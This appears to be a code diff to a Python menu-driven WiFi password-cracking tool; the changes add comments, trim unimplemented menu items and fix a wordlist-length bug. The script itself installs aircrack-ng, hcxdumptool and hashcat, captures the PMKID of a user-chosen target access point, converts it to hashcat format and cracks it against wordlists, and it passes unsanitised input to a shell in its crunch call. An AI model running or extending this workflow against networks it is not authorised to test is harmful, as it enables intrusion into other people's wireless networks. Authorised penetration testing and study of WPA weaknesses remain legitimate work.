@@ -3,15 +3,18 @@ import time
 import subprocess
 from subprocess import check_call
 
+# Global variable to store the wireless interface name
 interface = None
 
 def start():
+    """Install required tools for WiFi penetration testing"""
     print("\nInstalling necessary Tools..")
     print("This may take a while, please be patient\n")
     os.system("apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver hashcat -y")
     os.system("sleep 3 && clear")
 
 def main():
+    """Main menu function - displays options and handles user input"""
     cmd = os.system("clear")
     print("""\033[1;92m
                                             
@@ -22,9 +25,7 @@ def main():
 (1) PMKID Attack - Step 1: Monitor & Capture PMKID
 (2) PMKID Attack - Step 2: Crack PMKID Password
 (3) Scan Networks
-(4) Capturing Handshake(monitor mode needed)                    
-(5) Crack Handshake (Handshake needed)               
-(6) Create your own passwordlist
+(4) Create your own passwordlist
 
 (00)Exit
 ----------------------------------------------------------------------- """)
@@ -38,14 +39,6 @@ def main():
     elif number == "3":
         show_networks()
     elif number == "4":
-        print("[!] Handshake capture not implemented yet")
-        time.sleep(2)
-        main()
-    elif number == "5":
-        print("[!] Handshake cracking not implemented yet")
-        time.sleep(2)
-        main()
-    elif number == "6":
         create_passwordlist()
     elif number == "00":
         exit()
@@ -55,6 +48,7 @@ def main():
         main()
     
 def start_monitor_mode():
+    """Enable monitor mode on the specified wireless interface"""
     global interface
     interface = input("\nEnter the interface (Default: wlan0): ").strip()
     if not interface:
@@ -66,6 +60,7 @@ def start_monitor_mode():
     time.sleep(4)
 
 def stop_monitor_mode():
+    """Disable monitor mode and return interface to managed mode"""
     global interface
     if interface is None:
         print("\n[!] Monitor mode is not started yet.")
@@ -78,6 +73,7 @@ def stop_monitor_mode():
     main()
 
 def show_networks():
+    """Scan and display available wireless networks using airodump-ng"""
     global interface
     if interface is None:
         print("\n[!] Monitor mode is not started yet.")
@@ -87,7 +83,7 @@ def show_networks():
     os.system(f"airodump-ng {interface}")
 
 def pmkid_step1_capture():
-    """Step 1: Monitor networks and capture PMKID"""
+    """Step 1: Monitor networks and capture PMKID from target AP"""
     global interface
     if interface is None:
         print("\n[!] Your adapter must be in monitor mode first.")
@@ -97,11 +93,11 @@ def pmkid_step1_capture():
     print("PMKID ATTACK - STEP 1: MONITOR & CAPTURE")
     print("="*60)
 
-    # Scan for networks
+    # Scan for networks to identify target
     print("\n[+] Scanning for available networks...")
     show_networks()
 
-    # Get target details
+    # Get target AP details from user
     bssid = input("\nEnter the BSSID of the target AP: ").strip()
     channel = input("Enter Channel of the target AP: ").strip()
     
@@ -111,10 +107,10 @@ def pmkid_step1_capture():
         pmkid_step1_capture()
         return
 
-    # Set channel
+    # Set interface to target channel
     subprocess.run(["iwconfig", interface, "channel", channel])
 
-    # Capture PMKID
+    # Start PMKID capture using hcxdumptool
     print(f"\n[+] Starting hcxdumptool to capture PMKID from {bssid}...")
     print("[+] Press CTRL+C to stop when PMKID is captured.")
     time.sleep(3)
@@ -124,6 +120,7 @@ def pmkid_step1_capture():
     except KeyboardInterrupt:
         print("\n[+] PMKID capture stopped by user.")
 
+    # Check if PMKID was successfully captured
     pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
     if os.path.exists(pmkid_path):
         print(f"\n[✔] PMKID captured successfully! Saved at: {pmkid_path}")
@@ -140,7 +137,7 @@ def pmkid_step2_crack():
     print("PMKID ATTACK - STEP 2: CRACK PASSWORD")
     print("="*60)
 
-    # Check if pmkid.pcapng exists
+    # Check if PMKID capture file exists
     pmkid_path = "pmkid.pcapng"
     if not os.path.exists(pmkid_path):
         print(f"\n[!] {pmkid_path} not found in current directory.")
@@ -155,7 +152,7 @@ def pmkid_step2_crack():
 
     print(f"\n[+] Using PMKID file: {pmkid_path}")
 
-    # Convert to 22000 format
+    # Convert pcapng to hashcat-compatible 22000 format
     print("[+] Converting pcapng to hash file...")
     try:
         subprocess.run(["hcxpcapngtool", "-o", "pmkid.22000", pmkid_path], check=True)
@@ -171,6 +168,7 @@ def pmkid_step2_crack():
         main()
         return
 
+    # Verify hash file was created successfully
     hashfile = "pmkid.22000"
     if not os.path.exists(hashfile):
         print("[✘] Failed to create hash file!")
@@ -178,7 +176,7 @@ def pmkid_step2_crack():
         main()
         return
 
-    # Choose wordlist
+    # Select wordlist for password cracking
     print("\n[1] Use rockyou.txt (default)")
     print("[2] Use custom wordlist")
     choice = input("\n[+] Enter your choice: ").strip()
@@ -209,7 +207,7 @@ def pmkid_step2_crack():
         main()
         return
 
-    # Start cracking with hashcat
+    # Start password cracking using hashcat
     print(f"\n[+] Starting PMKID cracking with hashcat using {wordlist}...")
     print("[+] This may take a while depending on the wordlist size...")
     print("[+] To exit Press CTRL +C")
@@ -220,7 +218,7 @@ def pmkid_step2_crack():
     except KeyboardInterrupt:
         print("\n[+] Cracking stopped by user.")
 
-    # Prompt user to go back to main menu
+    # Ask user if they want to return to main menu
     print("\n[+] Password cracking process completed!")
     choice = input("[+] Do you want to go back to main menu? (y/n): ").strip().lower()
     if choice == 'y' or choice == 'yes':
@@ -230,17 +228,22 @@ def pmkid_step2_crack():
         exit()
 
 def create_passwordlist():
+    """Generate custom password list using crunch tool"""
     print("\n[+] Size of the file and time taken to create the password list depends on your input..")
     print("\n[+] Enter the characters to be included in the password list.")
     print("[+] Example: if you only want list include numbers enter : 0123456789")
     characters = input("\n[+] Enter the characters : ").strip()
     length = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
-    output = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
+    output = input("\n[+] Enter the maximum length of the password (8/64) : ").strip()
     print("\nCreating password list... Please wait.")
-    subprocess.run(f"crunch {length} {length} {characters} -o passwordlist.txt", shell=True)
+    # Generate password list using crunch with specified parameters
+    subprocess.run(f"crunch {length} {output} {characters} -o passwordlist.txt", shell=True)
+    # Display where password list was created
     a = os.getcwd()
     print(f"\nPassword list created at {a}\n")
     time.sleep(5)
+    
+    # Optional: Use generated password list for handshake cracking
     choice = input("\nDo you want to crack handshake using this password list? (y/n) : ")
     if choice == "y":
         handshake_path = input("\n[+] Enter the path of the handshake file: ").strip()
@@ -250,5 +253,6 @@ def create_passwordlist():
     main()
 
 if __name__ == "__main__":
+    # Install required tools and start the main program
     start()
     main()
